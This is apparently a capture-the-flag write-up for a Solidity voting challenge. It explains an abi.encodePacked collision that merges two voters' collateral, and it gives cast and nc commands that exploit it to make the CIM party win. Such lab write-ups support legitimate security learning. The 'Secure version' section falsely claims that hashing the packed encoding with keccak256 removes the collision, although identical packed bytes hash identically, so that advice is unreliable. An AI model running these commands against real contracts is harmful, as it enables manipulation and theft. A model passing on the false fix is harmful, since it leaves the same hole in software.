# NotADemocraticElection - CTF Solution

## Challenge Overview
- **Objective**: Make the CIM party win the election
- **Win Condition**: `TARGET.winner() == bytes3("CIM")`
- **Vote Target**: 1000 ether worth of votes
- **Initial State**: ALF has 100 ether deposited by "Satoshi Nakamoto"

## Vulnerability Analysis

### The Bug: abi.encodePacked Collision

The contract has a critical vulnerability in how it handles voter uniqueness vs voter signatures:

```solidity
// Uniqueness check uses nested mapping
mapping(string _name => mapping(string _surname => address _addr)) public uniqueVoters;

// Voter weight storage uses packed signature
mapping(bytes _sig => Voter) public voters;

function depositVoteCollateral(string memory _name, string memory _surname) external payable {
    require(uniqueVoters[_name][_surname] == address(0), "Already deposited");
    
    bytes memory voterSig = getVoterSig(_name, _surname);  // abi.encodePacked(_name, _surname)
    voters[voterSig].weight += msg.value;  // ❌ VULNERABLE!
    uniqueVoters[_name][_surname] = msg.sender;
}
```

### The Problem

`abi.encodePacked()` concatenates strings without delimiters, causing collisions:

- `abi.encodePacked("A", "B")` = `"AB"`
- `abi.encodePacked("AB", "")` = `"AB"`
- `abi.encodePacked("", "AB")` = `"AB"`

These are **different** in `uniqueVoters[name][surname]` but **identical** in `voters[sig]`!

## Exploit Strategy

1. **Deposit 500 ETH** as voter `("A", "B")`
   - Sets `uniqueVoters["A"]["B"] = msg.sender`
   - Adds 500 ETH to `voters[abi.encodePacked("A", "B")].weight`

2. **Deposit 500 ETH** as voter `("AB", "")`
   - Passes uniqueness check (different mapping keys)
   - Sets `uniqueVoters["AB"][""] = msg.sender`
   - Adds 500 ETH to `voters[abi.encodePacked("AB", "")].weight` ← **Same as step 1!**
   - Now `voters["AB"].weight = 1000 ETH`

3. **Vote for CIM** using `("A", "B")`
   - Verification passes: `uniqueVoters["A"]["B"] == msg.sender` ✓
   - Gets weight from `voters[abi.encodePacked("A", "B")]` = **1000 ETH**
   - Adds `1 * 1000 ETH = 1000 ETH` votes to CIM
   - `checkWinner()` sees `parties["CIM"].totalvotes >= 1000 ETH`
   - **CIM wins!** 🎉

## Manual Exploitation Steps

### Step 1: Get Connection Info
```bash
nc 94.237.62.103 34182
# Select option 1 to get:
# - Private key
# - Setup contract address  
# - Target contract address
```

### Step 2: Run Exploit

Using **cast** (Foundry):
```bash
# Set variables
export PRIVATE_KEY="your_key_here"
export TARGET="0xTargetAddress"
export RPC="http://94.237.62.103:52380"

# Deposit 500 ETH as ("A", "B")
cast send $TARGET "depositVoteCollateral(string,string)" "A" "B" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# Deposit 500 ETH as ("AB", "") - accumulates in same voterSig!
cast send $TARGET "depositVoteCollateral(string,string)" "AB" "" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# Vote for CIM with 1000 ETH weight
cast send $TARGET "vote(bytes3,string,string)" 0x43494d000000000000000000000000000000000000000000000000000000000000 "A" "B" \
  --private-key $PRIVATE_KEY --rpc-url $RPC

# Check if solved
cast call $SETUP "isSolved()" --rpc-url $RPC
```

Note: `0x43494d00...` is `bytes3("CIM")` padded to 32 bytes.

### Step 3: Get Flag
```bash
nc 94.237.62.103 34182
# Select option 3 to get the flag
```

## Alternative Collision Pairs

Any of these work:
- `("A", "B")` + `("AB", "")`
- `("", "AB")` + `("A", "B")`
- `("X", "YZ")` + `("XY", "Z")`
- `("Test", "User")` + `("TestU", "ser")`

The key is finding two (name, surname) pairs that:
1. Are different in the nested mapping
2. Produce identical `abi.encodePacked()` results

## Root Cause

The vulnerability stems from using `abi.encodePacked()` for dynamic types (strings) without delimiters. This is a well-known issue in Solidity.

**Secure version** would use:
```solidity
bytes memory voterSig = abi.encode(_name, _surname);  // Includes length prefixes
// OR
bytes32 voterSig = keccak256(abi.encodePacked(_name, _surname));  // Hash removes collision risk
```

## Key Takeaways

1. **Never use `abi.encodePacked()` with dynamic types for uniqueness**
2. Use `abi.encode()` or hash the result with `keccak256()`
3. Ensure logical consistency between different data structures
4. Test edge cases like empty strings and boundary concatenations
